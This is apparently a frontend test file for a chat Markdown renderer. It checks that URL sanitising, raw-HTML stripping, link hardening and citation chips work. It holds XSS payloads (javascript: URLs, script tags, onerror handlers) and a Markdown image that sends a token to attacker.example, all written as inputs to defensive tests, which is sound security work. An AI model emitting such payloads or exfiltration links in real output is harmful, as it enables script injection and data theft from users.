import { afterEach, describe, expect, it, vi } from 'vitest'
import { cleanup, fireEvent, render } from '@testing-library/react'
import MarkdownMessage, { safeUrl } from './MarkdownMessage.jsx'

afterEach(cleanup)

const citation = {
  id: 'K1', kind: 'PROJECT_KNOWLEDGE', label: 'Runbook', excerpt: 'Currency is required.', available: true, suspicious: false,
  source: { type: 'DOCUMENT_CHUNK', filename: 'runbook.md', versionNumber: 2, startLine: 3, endLine: 5 },
}

describe('safeUrl', () => {
  it('allows only http, https, mailto and citation anchors', () => {
    expect(safeUrl('https://example.com/a')).toBe('https://example.com/a')
    expect(safeUrl('mailto:dev@example.com')).toBe('mailto:dev@example.com')
    expect(safeUrl('#cite-K1')).toBe('#cite-K1')
    expect(safeUrl('javascript:alert(1)')).toBe('')
    expect(safeUrl('JaVaScRiPt:alert(1)')).toBe('')
    expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBe('')
    expect(safeUrl('vbscript:x')).toBe('')
    expect(safeUrl('/api/defects')).toBe('')
    expect(safeUrl(undefined)).toBe('')
  })
})

describe('MarkdownMessage', () => {
  it('never renders raw HTML, scripts or event handlers', () => {
    const { container } = render(<MarkdownMessage content={'Hello <script>alert(1)</script> <img src=x onerror="alert(2)"> <b onclick="x()">bold</b>'} />)
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
    expect(container.querySelector('[onclick]')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
  })

  it('does not load Markdown images (exfiltration guard)', () => {
    const { container } = render(<MarkdownMessage content={'![secret](https://attacker.example/leak?q=token)'} />)
    expect(container.querySelector('img')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  it('removes unsafe link protocols and hardens external links', () => {
    const { container } = render(<MarkdownMessage content={'[bad](javascript:alert(1)) and [docs](https://docs.example.com/x)'} />)
    const links = container.querySelectorAll('a')
    expect(links).toHaveLength(1)
    expect(links[0].getAttribute('href')).toBe('https://docs.example.com/x')
    expect(links[0].getAttribute('target')).toBe('_blank')
    expect(links[0].getAttribute('rel')).toBe('noopener noreferrer nofollow')
    expect(container.querySelector('.md-link-blocked').textContent).toBe('bad')
  })

  it('renders GFM tables, lists and headings', () => {
    const { container } = render(<MarkdownMessage content={'## Steps\n\n- one\n- two\n\n| A | B |\n|---|---|\n| 1 | 2 |'} />)
    expect(container.querySelector('h2').textContent).toBe('Steps')
    expect(container.querySelectorAll('li')).toHaveLength(2)
    expect(container.querySelector('.md-table-scroll table td').textContent).toBe('1')
  })

  it('renders code blocks as text with a copy action', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
    const { container, getByRole } = render(<MarkdownMessage content={'```js\nconst a = "<script>";\n```'} />)
    expect(container.querySelector('.md-code pre code').textContent).toBe('const a = "<script>";')
    expect(container.querySelector('script')).toBeNull()
    fireEvent.click(getByRole('button', { name: 'Copy code' }))
    expect(writeText).toHaveBeenCalledWith('const a = "<script>";')
  })

  it('turns only server-verified citation tokens into evidence chips', () => {
    const { container, getByRole } = render(<MarkdownMessage content={'Currency is required [K1]. Invented [K9]. In code: `[K1]`'} citations={[citation]} />)
    const chips = container.querySelectorAll('.chat-citation')
    expect(chips).toHaveLength(1)
    expect(chips[0].textContent).toContain('K1')
    expect(container.textContent).toContain('[K9]')
    expect(container.querySelector('code').textContent).toBe('[K1]')
    fireEvent.click(getByRole('button', { name: 'Evidence K1' }))
    expect(container.querySelector('.evidence-source').textContent).toContain('runbook.md')
    expect(container.querySelector('.evidence-source').textContent).toContain('Currency is required.')
  })
})
